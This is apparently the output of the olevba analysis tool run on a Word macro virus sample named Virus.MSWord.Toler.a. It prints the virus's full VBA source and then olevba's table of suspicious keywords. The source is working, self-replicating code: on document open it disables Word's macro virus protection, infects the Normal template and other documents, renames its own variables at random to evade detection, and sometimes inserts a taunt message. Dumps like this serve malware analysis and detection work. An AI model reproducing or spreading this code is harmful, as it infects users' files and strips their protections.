olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Toler.a-584c86240d7cd5c3e446fbe3f95fa34dcc41011e
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Toler.a-584c86240d7cd5c3e446fbe3f95fa34dcc41011e - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Tolerance!
Private Type PtmokZ
  OgeanbZ As Integer
  ClkxdiZ As Integer
  YvhppZ As Boolean
End Type
Private Sub Document_Open()
  Randomize
  Options.VirusProtection = False
  Dim BbsjcZ As Object, TbZ As Object
  Set BbsjcZ = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
  Set TbZ = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
  Dim VduplZ As PtmokZ, OcicZ As PtmokZ: VduplZ = KofcaZ(BbsjcZ): OcicZ = KofcaZ(TbZ)
  If OcicZ.ClkxdiZ = 0 Then
     XvbfZ BbsjcZ, TbZ, VduplZ, OcicZ
     Options.SaveNormalPrompt = False
  End If
  If (VduplZ.ClkxdiZ = 0) Or ((OcicZ.ClkxdiZ <> 0) And (VduplZ.ClkxdiZ <> OcicZ.ClkxdiZ)) Then
     XvbfZ TbZ, BbsjcZ, OcicZ, VduplZ
     ActiveDocument.SaveAs (ActiveDocument.FullName)
  ElseIf Rnd < 0.3 Then
     ActiveDocument.Range(0, 0).InsertParagraphBefore
     ActiveDocument.Range(0, 0).InsertBefore "MUD Forever! :-)"
     ActiveDocument.SaveAs (ActiveDocument.FullName)
  End If
End Sub
Private Sub XvbfZ(OgeanbZ As Object, RuswkiZ As Object, FromP As PtmokZ, ToP As PtmokZ)
  Dim IlZ As String, EhbgZ
  IlZ = OgeanbZ.Lines(FromP.OgeanbZ, FromP.ClkxdiZ)
  EhbgZ = Array("PleonabZ", "PtmokZ", "OgeanbZ", "RuswkiZ", "NnelhugZ", "ClkxdiZ", "YvhppZ", "BbsjcZ", "TbZ", "VduplZ", "OcicZ", "XvbfZ", "IlZ", "KlgcpaZ", "QrwwjboZ", "KanZ", "KofcaZ", "LapZ", "EhbgZ")
  For I = 0 To 18: LapZ IlZ, (EhbgZ(I)), PleonabZ(IlZ): Next I
  If ToP.YvhppZ Then RuswkiZ.DeleteLines 1, RuswkiZ.CountOfLines
  RuswkiZ.AddFromString IlZ
End Sub
Private Function PleonabZ(IlZ As String) As String
  Dim KlgcpaZ As String: KlgcpaZ = ""
  While (InStr(IlZ, KlgcpaZ) <> 0) Or (Len(KlgcpaZ) < 3)
     KlgcpaZ = ""
     For I = 1 To 10
         If Rnd > 0.5 Then
            If Len(KlgcpaZ) = 0 Then
                  KlgcpaZ = KlgcpaZ + Chr(Int(Rnd * 25 + 65))
            Else: KlgcpaZ = KlgcpaZ + Chr(Int(Rnd * 25 + 97))
            End If
         End If
     Next I
     KlgcpaZ = KlgcpaZ + "Z"
  Wend
  PleonabZ = KlgcpaZ
End Function
Private Sub LapZ(IlZ As String, QrwwjboZ As String, KanZ As String)
  Dim I As Long
  I = 1
  While InStr(I, IlZ, QrwwjboZ) <> 0
        I = InStr(I, IlZ, QrwwjboZ)
        IlZ = Left(IlZ, I - 1) + KanZ + Mid$(IlZ, I + Len(QrwwjboZ))
        Index = Index + 1
  Wend
End Sub
Private Function KofcaZ(NnelhugZ As Object) As PtmokZ
  KofcaZ.OgeanbZ = 0
  KofcaZ.ClkxdiZ = 0
  KofcaZ.YvhppZ = False
  For I = 1 To NnelhugZ.CountOfLines
   If NnelhugZ.Lines(I, 1) = "' Tolerance!" Then KofcaZ.OgeanbZ = I
   If NnelhugZ.Lines(I, 1) = "End Function 'Tolerance!" Then KofcaZ.ClkxdiZ = I - KofcaZ.OgeanbZ + 1
   If InStr(NnelhugZ.Lines(I, 1), "Private Sub Document_Open()") = 1 Then KofcaZ.YvhppZ = True
  Next I
End Function 'Tolerance!
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

